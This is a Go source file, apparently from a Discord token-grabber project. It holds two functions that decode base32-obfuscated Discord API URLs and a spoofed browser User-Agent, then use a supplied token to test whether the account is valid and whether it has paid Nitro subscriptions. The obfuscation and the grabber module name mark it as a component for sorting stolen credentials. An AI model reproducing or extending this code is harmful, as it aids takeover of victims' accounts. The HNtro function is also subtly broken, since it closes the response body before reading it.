package checker

import (
	"bytes"
	"grbreDsrc/protection"
	"io/ioutil"
	"net/http"
)

func Check(token string) bool {
	apiauth := "NB2HI4DTHIXS6ZDJONRW64TEFZRW63JPMFYGSL3WHEXXK43FOJZS6QDNMUXWY2LCOJQXE6I="
	Agent := "JVXXU2LMNRQS6NJOGAQCQV3JNZSG653TEBHFIIBRGAXDAOZAK5UW4NRUHMQHQNRUFEQEC4DQNRSVOZLCJNUXILZVGM3S4MZWEAUEWSCUJVGCYIDMNFVWKICHMVRWW3ZJEBBWQ4TPNVSS6OBYFYYC4NBTGI2C4MJYGIQFGYLGMFZGSLZVGM3S4MZWEBCWIZZPHA4C4MBOG4YDKLRXGQ======"
	var AgentB = protection.Read(Agent)
	var api = protection.Read(apiauth)
	req, _ := http.NewRequest("GET", api, nil)
	req.Header.Set("User-Agent", AgentB)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	req.Header.Set("Authorization", token)

	client := &http.Client{}
	resp, _ := client.Do(req)
	resp.Body.Close()

	if resp.StatusCode == 200 {
		return true
	} else {
		return false

	}
}

func HNtro(token string) bool {
	apibase32 := "NB2HI4DTHIXS6ZDJONRW64TEFZRW63JPMFYGSL3WHEXXK43FOJZS6QDNMUXWE2LMNRUW4ZZPON2WE43DOJUXA5DJN5XHG==="
	Agent := "JVXXU2LMNRQS6NJOGAQCQV3JNZSG653TEBHFIIBRGAXDAOZAK5UW4NRUHMQHQNRUFEQEC4DQNRSVOZLCJNUXILZVGM3S4MZWEAUEWSCUJVGCYIDMNFVWKICHMVRWW3ZJEBBWQ4TPNVSS6OBYFYYC4NBTGI2C4MJYGIQFGYLGMFZGSLZVGM3S4MZWEBCWIZZPHA4C4MBOG4YDKLRXGQ======"
	var api = protection.Read(apibase32)

	Agentbase := protection.Read(Agent)

	req, _ := http.NewRequest("GET", api, nil)

	req.Header.Set("User-Agent", Agentbase)
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", token)
	client := &http.Client{}
	resp, _ := client.Do(req)
	resp.Body.Close()
	bodyBytes, _ := ioutil.ReadAll(resp.Body)
	bytesCheck := bytes.Compare(bodyBytes, []byte("[]"))
	if bytesCheck == 0 {
		return false
	} else {
		return true
	}
	return false

}
